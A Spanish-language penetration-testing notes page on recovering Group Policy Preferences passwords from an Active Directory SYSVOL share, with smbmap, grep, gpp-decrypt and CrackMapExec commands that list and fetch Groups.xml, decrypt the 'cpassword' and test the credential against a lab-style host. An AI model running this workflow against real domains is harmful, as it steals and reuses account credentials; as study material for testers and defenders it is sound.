---
description: >-
  Es un recurso compartido de todo el dominio de Active Directory al que todos
  los usuarios autenticados tienen acceso de lectura. Contiene scripts de
  sesión, datos de política de grupos...
---

# Sysvol

## Intro

Podemos encontrarnos contraseñas de usuario, tanto cifradas como sin cifrar en un archivo dentro de sysvol.

En 2006 se compró por parte de Microsoft el policy maker del estándar de escritorio que luego se renombró y se lanzó como Windows Server 2008 cómo GPP "Group Policy Preferences" Una de las características más útiles de GPP es la posibilidad de almacenar y usar credenciales en varios escenarios.

Cuando se crea un GPP también se crea un "Groups.xml" asociado con los datos más relevantes donde se encuentra también una contraseña almacenada en AES256 bits. El problema es que antes del 2012 Microsoft publicó la clave privada AES, entonces al tener los usuarios autenticados acceso de lectura al Sysvol se pueden buscar archivos con terminación .xml que contengan "cpassword"

{% embed url="https://adsecurity.org/?p=2288" %}

## SMB

Hay ocasiones en las que nos podemos encontrar con SYSVOL en smb, por lo que sabemos que lo que nos interesa en vez de todo el contenido es directamente el archivo groups.xml

Podemos en primer lugar listar de forma recursiva:

```
smbmap -d DOMINIO -H 10.10.10.55 -R SYSVOL
```

Ahora le pedimos que descargue únicamente ese archivo

```
smbmap -d DOMINIO -H 10.10.10.55 -R SYSVOL -A Groups.xml -q
```

Y podemos grepearlo por la información que nos interesa de dicho archivo.

```
cat groups.xml | grep -o 'cpassword="[^"]\+"\|userName=[^"]\+"'

cpassword="edBSHOwhZLTjt/QS)FeIcJ83..."
userName="DOMINIO\USUARIO"
```

## Desencriptar contraseña

Existe una utilidad llamada gpp-decrypt que nos permite obtener la contraseña en texto plano.

```
gpp-decrypt edBSHOwhZLTjt/QS)FeIcJ83... 2>/dev/null

mypasswordsegura123!
```

Recordad que siempre podéis comprobarlo desde CrackMapExec

```
cme smb 10.10.10.55 -i 'USUARIO' -p 'mypasswordsegura123!'
```



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
